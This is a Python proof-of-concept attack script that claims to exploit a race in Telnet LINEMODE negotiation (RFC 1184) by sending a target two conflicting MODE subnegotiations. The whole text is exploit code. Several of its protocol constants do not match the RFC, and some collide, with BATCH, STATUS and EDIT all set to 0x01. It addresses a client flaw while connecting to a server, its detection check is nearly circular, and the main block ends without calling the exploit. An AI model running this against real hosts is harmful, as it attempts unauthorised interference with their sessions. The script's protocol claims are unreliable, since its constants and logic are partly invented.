#!/usr/bin/env python3
"""
Proof-of-Concept: TOCTOU in LINEMODE MODE Negotiation (RFC 1184)

This script demonstrates how an on-path attacker can inject conflicting
LINEMODE MODE commands to exploit a race condition in the client's state machine.
By sending two rapid, contradictory MODE requests, the client may resolve to
an unintended mode (e.g., RAW_MODE) due to lack of sequence tracking.
"""
import socket
import sys
import time
import struct

# Telnet Protocol Constants
IAC = b'\xff'
WILL = b'\xfb'
WONT = b'\xfc'
DO = b'\xfd'
DONT = b'\xfe'
SB = b'\xfa'  # Subnegotiation Begin
SE = b'\xf0'  # Subnegotiation End
LINEMODE = 34  # Option number for LINEMODE (RFC 1184)
MODE_SUBOPTION = 1  # MODE suboption type

# LINEMODE Mode Bits (RFC 1184 Section 2.1)
EDIT = 0x01
TRAPSIG = 0x02
AUTOEDIT = 0x04
AUTOTRANS = 0x08
AUTOLIST = 0x10
INPUT_MARKING = 0x20
OUTPUT_MARKING = 0x40
RFC_EDIT = 0x80
STATUS = 0x01  # Status bit in MODE command
ACK = 0x80     # ACK bit in MODE reply
BATCH = 0x01   # BATCH mode (disables editing)
RAW_MODE_MASK = ~(EDIT | TRAPSIG | AUTOEDIT | AUTOTRANS | AUTOLIST | INPUT_MARKING | OUTPUT_MARKING | RFC_EDIT) & 0xFF

def send_option(sock, command, option):
    """Send a Telnet command (WILL/WONT/DO/DONT)."""
    sock.sendall(IAC + command + struct.pack('B', option))

def send_linemode_mode(sock, mode_mask, is_reply=False):
    """
    Send a LINEMODE MODE subnegotiation.
    
    Args:
        sock: The socket connection.
        mode_mask: The desired mode mask (integer).
        is_reply: If True, sets the ACK bit in the mode mask.
    """
    if is_reply:
        mode_mask |= ACK
    
    # Subnegotiation format: SB LINEMODE MODE <mode> SE
    subneg = IAC + SB + struct.pack('B', LINEMODE) + struct.pack('B', MODE_SUBOPTION) + struct.pack('B', mode_mask) + IAC + SE
    sock.sendall(subneg)

def exploit_toctou(target_ip, target_port=23):
    """
    Exploit the TOCTOU vulnerability in LINEMODE negotiation.
    
    The attacker sends two conflicting MODE commands rapidly:
    1. One enabling EDIT (EDIT=1).
    2. One disabling EDIT (EDIT=0) or setting BATCH mode.
    
    Due to lack of sequence tracking, the client may process these
    out of order or resolve to an inconsistent state.
    """
    print(f"[*] Connecting to {target_ip}:{target_port}...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, target_port))
    
    # Step 1: Negotiate LINEMODE
    # Server usually initiates, but we can force it if needed.
    # For PoC, assume server sends LINEMODE negotiation or we trigger it.
    print("[*] Attempting to negotiate LINEMODE...")
    
    # Send DO LINEMODE to request the option
    send_option(sock, DO, LINEMODE)
    time.sleep(0.5)  # Allow server response
    
    # Read responses (simplified; real PoC would parse IAC sequences)
    try:
        data = sock.recv(1024)
        print(f"[*] Received: {data.hex()}")
    except Exception as e:
        print(f"[-] Error receiving response: {e}")
        return
    
    # Step 2: Inject TOCTOU Race Condition
    # Send two conflicting MODE commands in rapid succession.
    # Command 1: Enable EDIT (Mode = EDIT | TRAPSIG)
    mode_edit = EDIT | TRAPSIG
    print(f"[*] Sending MODE command with EDIT enabled (Mask: {mode_edit:#04x})...")
    send_linemode_mode(sock, mode_edit)
    
    # Command 2: Disable EDIT / Set BATCH (Mode = BATCH or RAW)
    # This is the conflicting command.
    mode_batch = BATCH
    print(f"[*] Sending MODE command with BATCH enabled (Mask: {mode_batch:#04x})...")
    send_linemode_mode(sock, mode_batch)
    
    # Step 3: Observe Outcome
    # In a vulnerable implementation, the client might:
    # - Acknowledge both without checking order.
    # - Resolve to an unintended mode (e.g., RAW_MODE).
    # - Drop one command silently causing state desync.
    
    print("[*] Waiting for client response...")
    time.sleep(1)
    try:
        resp = sock.recv(1024)
        if resp:
            print(f"[+] Received Response: {resp.hex()}")
            # Check if the response indicates an inconsistent mode
            # Look for SB LINEMODE MODE <mask> SE in response
            if IAC + SB + struct.pack('B', LINEMODE) in resp:
                idx = resp.find(IAC + SB + struct.pack('B', LINEMODE))
                if idx != -1:
                    # Extract mode mask (simplified parsing)
                    # Format: SB LINEMODE MODE <mask> SE
                    # Mask is at index + 4
                    mode_mask = resp[idx+4]
                    print(f"[!] Client resolved to Mode Mask: {mode_mask:#04x}")
                    if (mode_mask & EDIT) == 0 and (mode_batch & BATCH):
                        print("[!] VULNERABILITY DETECTED: Client may have resolved to unintended mode.")
                    else:
                        print("[*] Mode resolution appears consistent.")
            else:
                print("[-] No LINEMODE subnegotiation in response.")
        else:
            print("[-] No response received (possible timeout/drop).")
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 poc_linemode_toctou.py <target_ip> [port]")
        sys.exit(1)
    
